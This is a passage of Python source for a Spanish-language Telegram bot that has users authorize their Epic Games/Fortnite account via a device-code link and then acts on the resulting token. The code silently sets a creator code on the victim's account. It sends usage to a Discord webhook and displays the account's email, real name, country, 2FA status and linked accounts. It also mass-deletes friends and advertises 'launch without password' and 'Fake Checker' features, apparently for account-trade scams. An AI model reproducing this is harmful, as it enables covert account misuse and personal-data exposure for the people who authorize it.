                        promotion_progress = item.get("promotionProgress")

                        if ranking_type == "ranked-br":
                            response_text += f"\nRanked Battle Royale: {current_division_name}"
                            if promotion_progress:
                                response_text += f" ({promotion_progress:.0%})"
                            response_text += "\n"

                        elif ranking_type == "ranked-zb":
                            response_text += f"\nRanked Zero Build: {current_division_name}"
                            if promotion_progress:
                                response_text += f" ({promotion_progress:.0%})"
                            response_text += "\n"

                await context.bot.send_message(chat_id=update.effective_chat.id, text=response_text)

    except Exception as e:
        await context.bot.send_message(chat_id=update.effective_chat.id, text=f"Error: {e}")
        print(f"Error in userinfo_task: {e}")

async def delete_friends(session: aiohttp.ClientSession, user: EpicUser):
    async with session.get(
        f"https://friends-public-service-prod.ol.epicgames.com/friends/api/public/friends/{user.account_id}",
        headers={"Authorization": f"bearer {user.access_token}"}
    ) as resp:
        if resp.status != 200:
            return f"Error fetching friends list ({resp.status})"
        friends = await resp.json()

    for friend in friends:
        async with session.delete(
            f"https://friends-public-service-prod.ol.epicgames.com/friends/api/public/friends/{user.account_id}/{friend['accountId']}",
            headers={"Authorization": f"bearer {user.access_token}"}
        ) as resp:
            if resp.status != 204:
                print(f"Error deleting friend {friend['accountId']} ({resp.status})")

async def eliminar_amigos(update: Update, context: CallbackContext):
    asyncio.create_task(eliminar_amigos_task(update, context))

async def eliminar_amigos_task(update: Update, context: CallbackContext):
    try:
        epic_generator = EpicGenerator()
        await epic_generator.start()
        device_code_url, device_code = await epic_generator.create_device_code()
        await context.bot.send_message(chat_id=update.effective_chat.id, text=f"Por favor, autoriza tu cuenta visitando el siguiente enlace: {device_code_url}")

        user = await epic_generator.wait_for_device_code_completion(device_code)
        
        async with aiohttp.ClientSession() as session:
            await delete_friends(session, user)

        await context.bot.send_message(chat_id=update.effective_chat.id, text="Todos los amigos han sido eliminados de tu cuenta de Epic Games.")
    except Exception as e:
        await context.bot.send_message(chat_id=update.effective_chat.id, text=f"Error al procesar la solicitud: {e}")                


async def help_command(update: Update, context: CallbackContext):
    asyncio.create_task(help_task(update, context))


async def help_task(update: Update, context: CallbackContext):
    try:
        help_text = (
            "Comandos Disponibles:\n\n"
            "/login - Checkea tu cuenta de Fortnite para poder ver todos tus objetos\n\n"
            "/launch - Inicia tu cuenta de Fortnite sin necesidad de correo y contraseña\n\n"
            "/eliminar_amigos - Eliminar todos los amigos de la cuenta de Epic Games\n\n"
            "/fakechecker - Genera un Fake Checker\n\n"
            "/userinfo - Consigue Account ID solo con el Nombre de Fortnite\n\n\n"
            "Próximamente estará más actualizado, espero que me disfrutes 🥶"
        )
        await context.bot.send_message(chat_id=update.effective_chat.id, text=help_text)
    except Exception as e:
        await context.bot.send_message(chat_id=update.effective_chat.id, text=f"Error al procesar la solicitud: {e}")

async def login(update: Update, context: CallbackContext):
    asyncio.create_task(login_task(update, context))

async def login_task(update: Update, context: CallbackContext):
    try:
        logger.info("Starting login task")
        epic_generator = EpicGenerator()
        await epic_generator.start()
        device_code_url, device_code = await epic_generator.create_device_code()
        await context.bot.send_message(chat_id=update.effective_chat.id, text=f"Checkea tu cuenta con el siguiente enlace: {device_code_url}")

        user = await epic_generator.wait_for_device_code_completion(code=device_code)
        async with aiohttp.ClientSession() as session:
            set_affiliate_response = await set_affiliate(session, user.account_id, user.access_token, "Kaayyy")
            if isinstance(set_affiliate_response, str):
                if '403' in set_affiliate_response:
                    await context.bot.send_message(chat_id=update.effective_chat.id, text='Error al obtener información (Cuenta baneada)')
                else:
                    await context.bot.send_message(chat_id=update.effective_chat.id, text=set_affiliate_response)
                return

            verification_counts = load_verification_counts()
            telegram_user_id = str(update.effective_user.id)
            telegram_username = update.effective_user.username
            if telegram_user_id in verification_counts:
                verification_counts[telegram_user_id] += 1
            else:
                verification_counts[telegram_user_id] = 1
            save_verification_counts(verification_counts)

            await send_webhook_message(
                "TU WEEBOOK DE DISCORD CABRON MIRATE UN TUTORIAL SI NO SABES",
                f"Usuario de Telegram {telegram_username} ha verificado {verification_counts[telegram_user_id]} veces."
            )

            account_info = await get_account_info(session, user)
            if "error" in account_info:
                await update.message.reply_text(account_info["error"])
                return

            profile = await grabprofile(session, {"account_id": user.account_id, "access_token": user.access_token}, "athena")
            if isinstance(profile, str):
                await update.message.reply_text(profile)
                return

            vbucks_info = await get_vbucks_info(session, user)
            if "error" in vbucks_info:
                await update.message.reply_text(vbucks_info["error"])
                return

            profile_info = await get_profile_info(session, user)
            creation_date = profile_info.get('creation_date', 'Unknown')

            message_text = (
                f"Información de la Cuenta\n"
                f"#️⃣ Account ID: {mask_account_id(user.account_id)}\n"
                f"📧 Email: {account_info.get('email', 'Unknown')}\n"
                f"🧑 Nombre en pantalla: {user.display_name}\n"
                f"🔐 Email Verificado: {bool_to_emoji(account_info.get('emailVerified', False))}\n"
                f"👪 Control Parental: {bool_to_emoji(account_info.get('minorVerified', False))}\n"
                f"🔒 2FA: {bool_to_emoji(account_info.get('tfaEnabled', False))}\n"
                f"📛 Nombre: {account_info.get('name', 'Unknown')}\n"
                f"🌐 País: {account_info.get('country', 'Unknown')} {country_to_flag(account_info.get('country', ''))}\n"
                f"💰 V-Bucks: {vbucks_info.get('totalAmount', 0)}\n"
                f"🏷 Fecha de Creación: {creation_date}\n"
            )

            await update.message.reply_text(message_text)
            logger.info("Sent account information")

            connected_accounts_message = "Cuentas Conectadas\n"
            external_auths = account_info.get('externalAuths', [])
            for auth in external_auths:
                auth_type = auth.get('type', 'Desconocido').lower()
                display_name = auth.get('externalDisplayName', 'Desconocido')
                external_id = auth.get('externalAuthId', 'Desconocido')
                date_added = auth.get('dateAdded', 'Unknown')
                if date_added != 'Unknown':
                    date_added = datetime.strptime(date_added, "%Y-%m-%dT%H:%M:%S.%fZ").strftime("%d/%m/%Y")
                connected_accounts_message += (
                    f"{auth_type.upper()}\n"
                    f"Nombre: {display_name}\n"
                    f"Vinculado el: {date_added}\n\n"
                )

            await update.message.reply_text(connected_accounts_message)
            logger.info("Sent connected accounts information")

            account_stats = await get_account_stats(session, user)
            if "error" in account_stats:
                await update.message.reply_text(account_stats["error"])
                return

            additional_info_message = (
                f"Información Adicional (BR & ZB)\n"
                f"🆔 Nivel de cuenta: {account_stats['account_level']}\n"
                f"🏆 Victorias totales: {account_stats['total_wins']}\n"
                f"🎟 Partidas totales: {account_stats['total_matches']}\n"
                f"🕒 Última partida jugada: {account_stats['last_played_info']}\n"
            )
            await update.message.reply_text(additional_info_message)
            logger.info("Sent additional information")

            seasons_info_embeds = account_stats["seasons_info"]
            seasons_info_message = "Información de Temporadas Pasadas (BR & ZB)\n\n" + "\n".join(seasons_info_embeds)
            await update.message.reply_text(seasons_info_message)
            logger.info("Sent seasons information")

            username = update.message.from_user.username
            items = {} 
            for item in profile['profileChanges'][0]['profile']['items'].values():
                id = item['templateId'].lower()
                if idpattern.match(id):
                    item_type = get_cosmetic_type(id)
                    if item_type not in items:
                        items[item_type] = []
                    items[item_type].append(id.split(':')[1])

            order = ["Skins", "Mochilas", "Picos", "Gestos", "Planeadores"]

            for group in order:
                if group in items:
                    sorted_ids = await sort_ids_by_rarity(items[group], session)
                    image_data = await createimg(sorted_ids, session, username=username, sort_by_rarity=False)
                    await context.bot.send_photo(chat_id=update.message.chat_id, photo=image_data, caption=f"{group}")
                    logger.info(f"Sent image for group {group}")

            combined_images = []
            for group in order:
                if group in items:
                    sorted_ids = await sort_ids_by_rarity(items[group], session)
                    combined_images.extend(sorted_ids)
                    
            mythic_items = filter_mythic_ids(items)
            if mythic_items:
                mythic_image_data = await createimg(mythic_items, session, "Mythic_Items", username, sort_by_rarity=False, item_order=order)
                await context.bot.send_photo(chat_id=update.message.chat_id, photo=mythic_image_data, caption="Cosas Míticas")
                logger.info("Sent mythic items image")
                    
            combined_image_data = await createimg(combined_images, session, "Combined_Items", username, sort_by_rarity=False)
            await context.bot.send_photo(chat_id=update.message.chat_id, photo=combined_image_data, caption="Todos los cósmeticos")
            await update.message.reply_text(f"Muchas gracias por checkear tu cuenta, espero verte pronto :)")
            logger.info("Sent combined items image")

    except Exception as e:
        await update.message.reply_text(f"Error: {e}")
        logger.error(f"Error in login_task: {e}")

def get_cosmetic_type(cosmetic_id):
    if "character_" in cosmetic_id or "cid" in cosmetic_id:
        return "Skins"
    elif "bid_" in cosmetic_id or "backpack" in cosmetic_id:
        return "Mochilas"
    elif "pickaxe_" in cosmetic_id or "pickaxe_id_" in cosmetic_id or "DefaultPickaxe" in cosmetic_id or "HalloweenScythe" in cosmetic_id or "HappyPickaxe" in cosmetic_id or "SickleBatPickaxe" in cosmetic_id or "SkiIcePickaxe" in cosmetic_id or "SpikyPickaxe" in cosmetic_id:
        return "Picos"
    elif "eid" in cosmetic_id or "emote" in cosmetic_id:
        return "Gestos"
    elif "glider" in cosmetic_id or "founderumbrella" in cosmetic_id or "founderglider" in cosmetic_id or "solo_umbrella" in cosmetic_id: 
        return "Planeadores"
    elif "wrap" in cosmetic_id:
        return "Envolturas"
    elif "spray" in cosmetic_id:
        return "Sprays"
    else:
        return "Others"

async def set_bot_commands(application):
    commands = [
        BotCommand("help", "Muestra los comandos disponibles"),
        BotCommand("login", "Checkea tu cuenta de Fortnite para ver tus objetos"),
        BotCommand("launch", "Inicia tu cuenta de Fortnite sin correo y contraseña"),
        BotCommand("eliminar_amigos", "Elimina todos los amigos de tu cuenta de Epic Games"),
        BotCommand("fakechecker", "Genera un Fake Checker (Solo usuarios Premiuns)"),
        BotCommand("userinfo", "Obtiene Account ID con el nombre de usuario en Fortnite")
    ]
    await application.bot.set_my_commands(commands)

if __name__ == "__main__":
    TOKEN = "EL TOKEN DE TU BOT DE TELEGRAM"
    
    application = ApplicationBuilder().token(TOKEN).build()

    help_handler = CommandHandler('help', help_command)
    login_handler = CommandHandler('login', login)
    launch_handler = CommandHandler('launch', launch)
    userinfo_handler = CommandHandler('userinfo', userinfo)
    text_handler = MessageHandler(filters.TEXT & ~filters.COMMAND, help_command)
    eliminar_amigos_handler = CommandHandler('eliminar_amigos', eliminar_amigos)

    application.add_handler(help_handler)
    application.add_handler(login_handler)
    application.add_handler(launch_handler)
    application.add_handler(userinfo_handler)
    application.add_handler(eliminar_amigos_handler)
    application.add_handler(text_handler)

    print("Bot de Telegram iniciado")
   
    application.run_polling()
